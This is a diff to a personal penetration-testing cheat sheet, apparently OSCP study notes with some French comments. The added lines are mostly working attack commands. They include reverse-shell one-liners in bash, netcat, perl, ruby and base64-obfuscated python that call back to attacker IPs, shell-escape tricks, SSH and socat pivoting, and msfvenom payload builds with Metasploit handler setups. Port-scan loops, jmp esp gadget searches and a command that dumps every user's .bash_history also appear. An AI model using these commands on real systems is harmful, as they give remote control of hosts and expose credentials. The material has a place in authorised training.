@@ -132,7 +132,22 @@ https://netsec.ws/?p=337
 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method2usingsocat%20target=
 
 python -c 'import pty; pty.spawn("/bin/sh")'
+echo os.system('/bin/bash')
+/bin/sh -i
+perl -e 'exec "/bin/sh";'
 
+perl - exec "/bin/sh";
+
+ruby - exec "/bin/sh"
+
+lua - os.execute('/bin/sh')
+IRB - exec "/bin/sh"
+
+vi - :!bash
+
+vi - :set shell=/bin/bash:shell
+
+nmap - !sh
 
 === Server
 python3 -m http.server 8888 --directory /home/kali/OSPC/Tools/
@@ -147,12 +162,17 @@ https://github.com/rebootuser
 ===port forwarding 
 
 ==== Socat
+
 socat TCP-LISTEN:<<Straylight_TCP_PORT>>,fork,reuseaddr TCP:<<Neuromancer_IP_address>>:<<Neuromancer_TCP_PORT>> &
 socat TCP-LISTEN:8009,fork,reuseaddr TCP:192.168.212.4:8009 &
 
 ==== ssh
 ssh -L 8080:internalTarget:80 user@compromisedMachine
 ssh -L 8080:internalTarget:22 user@compromisedMachine
+
+kali> ssh -N -f -L 9000:cible.ip:22 root@pivot.ip
+
+pivot> ssh -N -f -R 2222:cible.ip:22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@attacker.ip 
 
 ==== Meterpreter session
 
@@ -167,7 +187,7 @@ portfwd flush
 
 for i in $(seq 1 65535); do nc -nvz -w 1 192.168.212.4 $i 2>&1; done | grep -v "refused"
 
-
+for i in $(seq 1 65535); do nc -nvz -w 1 127.0.0.1 $i 2>&1; done | grep -v "refused"
 ===netstat
 netstat -i
 netstat -antp | grep 1234
@@ -178,15 +198,17 @@ netstat -lnp tcp
 
 
 
+bash -i> /dev/tcp/192.168.110.1/4444 0>&1
 
-use exploit/multi/handler
 set payload php/meterpreter/reverse_tcp
-set payload linux/x86/shell/reverse_tcp
 
 
 
 ===msfvenom
+
 https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner-payload/
+https://null-byte.wonderhowto.com/how-to/elevate-netcat-shell-meterpreter-session-for-more-power-control-0193211/
+https://pravinponnusamy.medium.com/reverse-shell-payloads-969366fa5aff
 
 msfvenom -a x86 --platform linux -p linux/x86/exec -f py -b '\x0d\x0a\x00\xff' CMD=/bin/sh PrependSetresuid=true
 
@@ -195,20 +217,77 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o rev 
 
 
 msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.103 lport=1111 R
+0<&21-;exec 21<>/dev/tcp/192.168.110.1/443;sh <&21 >&21 2>&21
 
-msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.103 lport=2222 R
-msfvenom -p cmd/unix/reverse_perl lhost=192.168.1.103 lport=3333 R
-msfvenom -p cmd/unix/reverse_python lhost=192.168.1.103 lport=4444 R
-msfvenom -p cmd/unix/reverse_ruby lhost=192.168.1.103 lport=5555 R
-msfvenom -p cmd/unix/reverse_netcat_gaping lhost=192.168.1.103 lport=6666 R
-msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.103 lport=6666 R
+msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.1 lport=443 R
+mkfifo /tmp/fond; nc 192.168.1.1 443 0</tmp/fond | /bin/sh >/tmp/fond 2>&1; rm /tmp/fond
+msfvenom -p cmd/unix/reverse_netcat_gaping lhost=192.168.1.1 lport=443 R
+nc 192.168.1.1 443 -e /bin/sh
+
+msfvenom -p cmd/unix/reverse_perl lhost=192.168.1.1 lport=443 R
+perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.1.1:443");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
+
+msfvenom -p cmd/unix/reverse_python lhost=192.168.1.1 lport=443 R
+python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgICAgLCAgICBzdWJwcm9jZXNzICAgICAgICAsICAgIG9zICAgICA7ICAgIGhvc3Q9IjE5Mi4xNjguMS4xIiAgICAgOyAgICBwb3J0PTQ0MyAgICAgOyAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgICAgICwgICAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgICAgOyAgICBzLmNvbm5lY3QoKGhvc3QgICAgICAgICwgICAgcG9ydCkpICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAgICAwKSAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgICAgMSkgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsICAgIDIpICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"
+
+msfvenom -p cmd/unix/reverse_ruby lhost=192.168.1.1 lport=443 R
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.1","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+
+
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -a x64 --platform linux -f elf -o rev
+msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f elf -a x86 -o rev
 
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f elf -o meterpreter
+
+=== Meterpreter
+
+msfvenom --platform linux --arch x86 --payload linux/x86/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 --format elf --out rev
+
+msf6 > use exploit/multi/handler 
+msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.110.1
+msf6 exploit(multi/handler) > run
+
 
 msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f raw -o rev.php
 
+msf6 > use exploit/multi/handler 
+msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.110.1
+msf6 exploit(multi/handler) > run
+
+
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload linux/x86/shell_reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.110.1
+msf6 exploit(multi/handler) > run
+
+nc 192.168.110.1 4444 -e /bin/sh
+
+
+
+=== Shell
+
+https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f elf > shell-x86.elf
+
+use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.110.1
+msf6 exploit(multi/handler) > run
+
+
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.110.1 LPORT=4444 -a x64 --platform linux -f elf -o rev
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.110.1 LPORT=4444 -a x86 --platform linux -f elf -o rev
+msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.227.1 LPORT=443 -o shell.php
+
+msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp -f elf -a x86 -o rev1
+
+
 =====Tomcat
+
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.1 LPORT=1234 -f war > update.war
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f war -o evil.war
 
@@ -611,3 +690,85 @@ https://guif.re/bo
 4- Finding bad characters
 5- Injecting a shellcode
 
+
+gdb-peda$ asmsearch "jmp esp"
+gdb-peda$ asmsearch "call esp"
+gdb-peda$ find "\xff\xd4" binary
+gdb-peda$ find "\xff\xe4" binary
+
+
+
+
+
+= Scan IP
+
+#!/bin/bash
+TF=$(mktemp -u)
+touch $TF
+is_alive_ping()
+{
+  ping -c 1 $1 > /dev/null
+  [ $? -eq 0 ] && echo Node with IP: $i is up. >> $TF
+}
+
+for i in 192.168.0.{1..254} 
+do
+is_alive_ping $i & disown
+done
+sleep 1
+cat $TF
+rm $TF
+
+ == Scan ports
+
+ for i in $(seq 1 65535); do nc -z -v 192.168.3.50 $i 2>&1 | grep 'open'; done
+
+
+
+==ROT13
+
+```console
+
+ tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
+```
+
+
+== SED
+
+```console
+
+sed 's/<pre>/<pre>\n/g' 
+
+```
+
+Garder seuelement le texte entre <pre> text </pre>
+
+```console
+
+sed -e 's/<[^>]*>//g'
+
+```
+Supprimer toutes les balises
+
+
+```console
+
+sed -r -e '1d' -e '$d' -e 's/^\s+//'
+
+```
+
+Supprimer la première ligne et la dernière ligne
+
+
+
+
+## scan ports
+
+for i in $(seq 1 65535); do nc -z -v 192.168.2.200 $i 2>&1 | grep 'open'; done
+
+
+
+
+==
+find  /home -name ".bash_history" 2>/dev/null -exec cat {} \;
